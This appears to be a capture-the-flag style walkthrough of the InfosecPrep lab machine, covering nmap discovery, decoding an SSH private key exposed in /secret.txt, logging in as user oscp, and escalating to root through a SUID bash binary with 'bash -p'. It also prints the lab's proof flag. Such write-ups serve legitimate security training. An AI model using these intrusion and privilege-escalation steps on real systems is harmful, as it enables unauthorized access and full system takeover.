# InfosecPrep

- [Discovery](#discovery)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)

## Discovery

1) We run `nmap` to discover open TCP ports on the target

``` ┌──(kali㉿kali)-[~]
└─$ nmap -v -p- -T4 infosecprep

...

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

2) We run `nmap` again to determine additional information about running services including service versions


```
┌──(kali㉿kali)-[~]
└─$ nmap -v -p 22,80,33060 -T4 -A infosecprep

...

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-generator: WordPress 5.4.2
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/3%Time=65E4F885%P=aarch64-unknown-linux

              (... bunch of garbage, omitted for brevity ...)

SF:ssage\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay, so what immediately comes up to mind is we need to have a look at that WordPress 5.4.2 webserver

3) Checking out the webserver in the browser:

<img src="./assets/oscp-voucher.png" width=500px></img>

Seems like this box is a very CTF-like exercise...

We are given that there is a user `oscp` in the machine... that's nice.

## Foothold

4) From our `nmap` results we know that there was an entry in the webserver's `robots.txt` file for `/secret.txt`, so let's have a look at that too.

<img src="./assets/secret-txt-blob.png" width=500px></img>

A clearly base64 encoded blob... Let's decode it.

5) Decoding the blob we see that it is a private key:

```
┌──(kali㉿kali)-[~]
└─$ wget -q -O- http://infosecprep/secret.txt | base64 -d                                                  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn

              (... whole key omitted for brevity ...)

kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

6) What are the odds its for user `oscp`? Let's try it.

```
┌──(kali㉿kali)-[~]
└─$ wget -q -O- http://infosecprep/secret.txt | base64 -d > id_rsa.priv 
```

```
┌──(kali㉿kali)-[~]
└─$ ssh oscp@infosecprep -i id_rsa.priv 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

              (... whole banner omitted for brevity ...)

Last login: Sun Mar  3 23:28:26 2024 from 192.168.45.239
-bash-5.0$ whoami
oscp
```

...aaaand we are in! (as user `oscp`)

## Privilege Escalation

7) We aren't done yet, we want root! I check for odd binaries with SUID

```
-bash-5.0$ ls -la /usr/bin | grep rws
-rwsr-sr-x  1 daemon daemon     55560 Nov 12  2018 at
-rwsr-sr-x  1 root   root     1183448 Feb 25  2020 bash
-rwsr-xr-x  1 root   root       85064 May 28  2020 chfn
-rwsr-xr-x  1 root   root       53040 May 28  2020 chsh
-rwsr-xr-x  1 root   root       39144 Mar  7  2020 fusermount
-rwsr-xr-x  1 root   root       88464 May 28  2020 gpasswd
-rwsr-xr-x  1 root   root       55528 Apr  2  2020 mount
-rwsr-xr-x  1 root   root       44784 May 28  2020 newgrp
-rwsr-xr-x  1 root   root       68208 May 28  2020 passwd
-rwsr-xr-x  1 root   root       31032 Aug 16  2019 pkexec
-rwsr-xr-x  1 root   root       67816 Apr  2  2020 su
-rwsr-xr-x  1 root   root      166056 Feb  3  2020 sudo
-rwsr-xr-x  1 root   root       39144 Apr  2  2020 umount
```

Too easy! Bash has SUID!

8) Escalating ourselves by simply invoking bash with the `-p` flag (for privileged)

```
-bash-5.0$ bash -p 
bash-5.0# whoami
root
```

9) We find our flag in the usual place

```
bash-5.0# ls -la /root | grep -e proof -e txt
-rw-r--r--  1 root root   32 Aug 28  2020 flag.txt
-rw-r--r--  1 root root   33 Mar  3 22:18 proof.txt
bash-5.0# cat /root/proof.txt
71c987e5c7bddd8a2eaaf74208aec194
```
